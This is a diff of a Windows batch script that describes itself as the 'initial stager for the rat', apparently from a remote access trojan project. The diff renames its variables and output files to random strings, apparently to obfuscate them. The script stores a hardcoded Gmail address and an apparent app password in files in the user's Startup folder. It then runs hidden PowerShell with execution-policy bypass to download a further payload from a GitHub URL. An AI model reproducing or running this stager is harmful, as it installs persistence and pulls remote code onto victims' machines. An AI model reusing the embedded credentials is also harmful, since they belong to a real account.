@@ -2,15 +2,15 @@
 
 @rem initial stager for the rat
 
-set email="defalttests@gmail.com"
-set password="nkos qxgo yxvo brmr"
+set MLrZWNKzXe="defalttests@gmail.com"
+set JKgSYUywNCvkasmW="nkos qxgo yxvo brmr"
 set InitialPath=%cd%
 set StartupDir=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup
 
 @rem go to startup
 cd %StartupDir%
-echo %email%>email.txt
-echo %password%>password.txt
+echo %MLrZWNKzXe%>KHPWMpTitfZ.txt
+echo %JKgSYUywNCvkasmW%>oSyEZsgTWIU.txt
 
 @rem Download payload
 powershell powershell.exe -noP -W hidden -ep bypass -c "iwr -uri 'https://raw.githubusercontent.com/Soumyo001/Project-0nlyRAT/refs/heads/main/payloads/wget.cmd' -outfile '.\wget.cmd'"
